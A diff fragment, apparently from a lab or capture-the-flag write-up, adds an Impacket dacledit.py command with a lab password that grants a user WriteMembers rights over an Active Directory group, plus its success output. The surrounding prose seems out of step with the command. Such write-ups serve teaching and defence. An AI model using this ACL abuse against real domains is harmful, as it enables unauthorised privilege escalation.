@@ -628,5 +628,15 @@ Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its a
 First ill take ownership of the group
 
 ```python
+dacledit.py -action 'write' -rights 'WriteMembers' -principal 'steve.wills' -target-dn 'CN=IT SUPPORT USERS,CN=USERS,DC=NOVAFORGE,DC=LOCAL' 'novaforge.local'/'steve.wills':'Password123!'
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260807-182721.bak
+[*] DACL modified successfully!
+```
+
+Then ill give myself the ability to add members to the group
+
+```python
 
 ```
